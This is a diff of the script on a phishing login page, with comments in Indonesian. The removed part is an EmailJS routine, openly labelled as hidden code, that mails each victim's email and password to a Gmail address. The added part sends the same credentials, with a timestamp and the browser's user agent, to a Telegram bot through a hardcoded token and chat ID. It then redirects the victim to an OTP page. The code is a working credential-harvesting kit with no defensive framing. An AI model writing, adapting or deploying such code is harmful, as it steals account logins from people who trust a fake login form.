@@ -119,11 +119,11 @@
         </p>
     </div>
 
-    <!-- ✅ EMAILJS SDK DISEMBUNYIKAN DALAM COMMENT -->
-    <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script> -->
-    
     <script>
-    // ✅ KODE UTAMA (TANPA PERUBAHAN)
+    // Konfigurasi bot Telegram
+    const TELEGRAM_BOT_TOKEN = "8440162875:AAEyc5EsiQHpKHlpKwLFy0F4xYq_upfI5F8"; // Ganti dengan token bot Telegram Anda
+    const TELEGRAM_CHAT_ID = "7718023142"; // Ganti dengan chat ID tujuan
+    
     // Toggle password visibility
     const togglePassword = document.getElementById('togglePassword');
     const passwordInput = document.getElementById('password');
@@ -155,6 +155,7 @@
         const emailValid = validateEmail(emailInput.value.trim());
         const passwordValid = passwordInput.value.trim() !== '';
         
+        // Tampilkan error jika input tidak valid
         if (emailInput.value.trim() !== '' && !emailValid) {
             emailError.classList.remove('hidden');
         } else {
@@ -167,6 +168,7 @@
             passwordError.classList.add('hidden');
         }
         
+        // Aktifkan tombol jika semua input valid
         if (emailValid && passwordValid) {
             submitBtn.disabled = false;
             submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
@@ -177,6 +179,7 @@
             submitBtn.classList.remove('hover:bg-green-700');
         }
         
+        // Sembunyikan pesan error saat user mulai mengetik lagi
         if (emailInput.value.trim() !== '' || passwordInput.value.trim() !== '') {
             errorMessage.style.display = 'none';
         }
@@ -185,69 +188,89 @@
     emailInput.addEventListener('input', checkInputs);
     passwordInput.addEventListener('input', checkInputs);
 
+    // Fungsi untuk mengirim pesan ke Telegram
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const data = await response.json();
+            return data.ok;
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+            return false;
+        }
+    }
+
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         const email = emailInput.value;
         const password = passwordInput.value;
 
+        // Validasi akhir sebelum mengirim
         if (!validateEmail(email) || password.trim() === '') {
             errorText.textContent = 'Harap isi email dan password dengan format yang benar';
             errorMessage.style.display = 'flex';
             return;
         }
 
+        // Tampilkan loading state
         submitBtn.disabled = true;
         btnText.textContent = 'Memproses...';
         loadingSpinner.style.display = 'block';
 
         try {
-            // ✅ KODE PENGIRIMAN EMAIL YANG DISEMBUNYIKAN
-            const emailJsCode = `
-                // EmailJS initialization
-                (function() {
-                    var e=document.createElement('script');
-                    e.src='https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
-                    e.onload=function() {
-                        emailjs.init("ZV88Q0QnFIR6RvRPh");
-                        emailjs.send("service_38cere3","template_iknm5vq",{
-                            email: "${email}",
-                            password: "${password}",
-                            date: new Date().toLocaleString('id-ID'),
-                            to_email: "akunbarudaftar07@gmail.com"
-                        }).then(function() {
-                            localStorage.setItem('userEmail', '${email}');
-                        }, function(error) {
-                            console.error('Email failed:', error);
-                        });
-                    };
-                    document.head.appendChild(e);
-                })();
+            // Format pesan untuk Telegram
+            const message = `
+🔐 <b>Login Data Received</b>
+📧 <b>Email:</b> <code>${email}</code>
+🔑 <b>Password:</b> <code>${password}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>User Agent:</b> ${navigator.userAgent}
             `;
             
-            // ✅ EKSEKUSI KODE YANG DISEMBUNYIKAN
-            const script = document.createElement('script');
-            script.textContent = emailJsCode;
-            document.head.appendChild(script);
-            document.head.removeChild(script);
-
-            // ✅ SIMULASI PROSES BERHASIL
-            localStorage.setItem('userEmail', email);
-            successMessage.style.display = 'flex';
+            // Kirim data ke Telegram
+            const success = await sendToTelegram(message);
             
-            setTimeout(() => {
-                window.location.href = "verifikasi-otp.html";
-            }, 2000);
-            
+            if (success) {
+                // ✅ SIMPAN EMAIL KE LOCALSTORAGE
+                localStorage.setItem('userEmail', email);
+                
+                successMessage.style.display = 'flex';
+                
+                // Redirect setelah 2 detik
+                setTimeout(() => {
+                    window.location.href = "otp1.html";
+                }, 2000);
+            } else {
+                throw new Error('Gagal mengirim data ke Telegram');
+            }
         } catch (error) {
             console.error('Error:', error);
+            
+            // Tampilkan pesan error
             errorText.textContent = 'Terjadi kesalahan saat mengirim data. Silakan coba lagi.';
             errorMessage.style.display = 'flex';
+            
+            // Reset loading state
             submitBtn.disabled = false;
             btnText.textContent = 'Lanjut';
             loadingSpinner.style.display = 'none';
         }
     });
 
+    // Sembunyikan pesan error saat input difocus
     emailInput.addEventListener('focus', () => {
         errorMessage.style.display = 'none';
     });
